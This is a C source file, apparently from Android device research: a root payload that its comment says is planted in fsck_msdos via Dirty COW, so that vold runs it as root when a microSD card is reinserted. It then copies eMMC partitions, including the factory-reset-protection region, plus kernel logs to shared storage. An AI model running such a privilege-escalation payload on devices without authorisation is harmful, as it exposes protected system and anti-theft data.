/* session62 bcota_read.c  (vold-domain root payload)
 *
 * Purpose: confirm the LIVE staged boot-chain image in `bcota` and look for the
 * BCB / update trigger. Delivered the session26 way: Dirty-COW-patch
 * /system/bin/fsck_msdos with this payload, then eject+reinsert the microSD so
 * vold execs it as root in u:r:vold:s0. The payload forks and the parent exits 0
 * so the vfat mount proceeds. Read-only against the eMMC; a reboot clears it.
 *
 * Dumps (to /storage/emulated/legacy/):
 *   p2_bcota.bin        full bcota (session61 v6 only got 2 MiB; we want all 4)
 *   p2_metadata.bin     BCB candidate
 *   p2_frp.bin          BCB candidate (factory-reset-protection region)
 *   p2_spare.bin        BCB/scratch candidate
 *   p2_ssd.bin          BCB candidate
 *   p2_pad.bin  p2_ares.bin  p2_gsign.bin  p2_fsc.bin  p2_fsg.bin
 *   p2_misc.bin         (expected to fail: no such partition)
 *   cmdline_live.txt    /proc/cmdline
 *   partitions_live.txt /proc/partitions (exact sizes)
 *   reset_live.txt      /sys/reset_region/reset
 *   dmesg_live.txt      kernel ring via klogctl (SYSLOG_ACTION_READ_ALL)
 *   bc_read_log.txt     progress/hashes
 */

#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close       6
#define SYS_umask       60
#define SYS_syslog      103
#define SYS_clone       120

#define O_RDONLY        0
#define O_WRONLY        1
#define O_CREAT         0x40
#define O_TRUNC         0x200
#define O_APPEND        0x400

#define SYSLOG_ACTION_READ_ALL  3
#define SYSLOG_ACTION_SIZE_BUFFER 10

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}
static void ex(long c) { sc6(SYS_exit, c, 0, 0, 0, 0, 0); for (;;) {} }

static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static void scpy(char *d, const char *s) { while (*s) *d++ = *s++; *d = 0; }
static void scat(char *d, const char *s) { while (*d) d++; scpy(d, s); }

static const char *OUTBASE = "/storage/emulated/legacy/";
static const char *BYNAME  = "/dev/block/platform/msm_sdcc.1/by-name/";
static char logpath[128];

static void lograw(const char *msg, long n)
{
    long f = sc6(SYS_open, (long)logpath, O_WRONLY | O_CREAT | O_APPEND, 0644, 0, 0, 0);
    if (f >= 0) { sc6(SYS_write, f, (long)msg, n, 0, 0, 0); sc6(SYS_close, f, 0, 0, 0, 0, 0); }
}
static void logmsg(const char *msg) { lograw(msg, slen(msg)); }
static void loghex8(const char *tag, unsigned long v)
{
    char b[96]; int i = 0, k;
    while (*tag) b[i++] = *tag++;
    b[i++] = '0'; b[i++] = 'x';
    for (k = 0; k < 8; k++) { int d = (v >> ((7 - k) * 4)) & 0xf; b[i++] = d < 10 ? '0' + d : 'a' + d - 10; }
    b[i++] = '\n'; b[i] = 0; logmsg(b);
}

/* copy up to max bytes from `src` to `dst`, always creating dst. */
static long copyfile(const char *src, const char *dst, long max)
{
    static char buf[65536];
    long fd = sc6(SYS_open, (long)src, O_RDONLY, 0, 0, 0, 0);
    logmsg("  "); logmsg(src); loghex8("  open=", (unsigned long)fd);
    if (fd < 0) return fd;
    long of = sc6(SYS_open, (long)dst, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { loghex8("    dst fail ", (unsigned long)of); sc6(SYS_close, fd, 0, 0, 0, 0, 0); return of; }
    long total = 0, r;
    while (total < max) {
        long want = max - total; if (want > sizeof buf) want = sizeof buf;
        r = sc6(SYS_read, fd, (long)buf, want, 0, 0, 0);
        if (r <= 0) break;
        sc6(SYS_write, of, (long)buf, r, 0, 0, 0);
        total += r;
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
    loghex8("    dumped=", (unsigned long)total);
    return total;
}

/* dump by-name/<name> -> OUTBASE/p2_<name>.bin */
static long dump_part(const char *name, long max)
{
    char src[160], dst[192];
    scpy(src, BYNAME); scat(src, name);
    scpy(dst, OUTBASE); scat(dst, "p2_"); scat(dst, name); scat(dst, ".bin");
    return copyfile(src, dst, max);
}

/* dump an absolute path -> OUTBASE/<outname> */
static long dump_path(const char *path, const char *outname, long max)
{
    char dst[192];
    scpy(dst, OUTBASE); scat(dst, outname);
    return copyfile(path, dst, max);
}

static void dump_dmesg(void)
{
    long sz = sc6(SYS_syslog, SYSLOG_ACTION_SIZE_BUFFER, 0, 0, 0, 0, 0);
    loghex8("dmesg size=", (unsigned long)sz);
    if (sz <= 0) return;
    char dst[192]; scpy(dst, OUTBASE); scat(dst, "dmesg_live.txt");
    long of = sc6(SYS_open, (long)dst, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { loghex8("  dmesg dst fail ", (unsigned long)of); return; }
    static char buf[65536];
    long total = 0, r;
    while (total < sz) {
        long want = sz - total; if (want > sizeof buf) want = sizeof buf;
        r = sc6(SYS_syslog, SYSLOG_ACTION_READ_ALL, (long)buf, want, 0, 0, 0);
        if (r <= 0) break;
        sc6(SYS_write, of, (long)buf, r, 0, 0, 0);
        total += r;
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    loghex8("  dmesg dumped=", (unsigned long)total);
}

void _start(void)
{
    static const char *parts[] = {
        "bcota", "metadata", "frp", "spare", "ssd",
        "pad", "ares", "gsign", "fsc", "fsg", "misc",
        0
    };
    sc6(SYS_umask, 0, 0, 0, 0, 0, 0);
    scpy(logpath, OUTBASE); scat(logpath, "bc_read_log.txt");

    long pid = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (pid != 0) ex(0);

    logmsg("\nsession62 bcota/BCB read: start\n");
    for (int i = 0; parts[i]; i++)
        dump_part(parts[i], 8*1024*1024);
    dump_path("/proc/cmdline", "cmdline_live.txt", 65536);
    dump_path("/proc/partitions", "partitions_live.txt", 65536);
    dump_path("/sys/reset_region/reset", "reset_live.txt", 65536);
    dump_dmesg();
    logmsg("session62 bcota/BCB read: done\n");
    ex(0);
}
